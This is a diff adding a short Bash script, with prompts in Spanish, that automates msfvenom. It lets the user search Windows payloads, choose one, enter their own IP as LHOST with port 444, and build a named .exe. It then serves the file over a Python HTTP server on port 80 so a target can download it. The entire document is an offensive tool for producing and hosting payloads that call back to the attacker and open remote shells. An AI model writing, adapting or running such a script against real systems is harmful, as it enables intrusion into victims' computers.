@@ -1,0 +1,15 @@
+#!/bin/bash 
+echo "que payload quiers buscar, windows"
+read payload
+payload=$payload
+msfvenom -l payloads | grep $payload
+echo "que payload quieres utilizar, windows"
+read pay
+echo "cual es tu ip"
+read ip
+echo "que nombre le quieres poner a tu archivo, sin la extension"
+read nom
+pay=$pay
+ip=$ip
+nom=$nom
+msfvenom -p $pay LHOST=$ip LPORT=444 -f exe -o $nom.exe && python3 -m http.server 80 || echo "creo que hay algun problema"
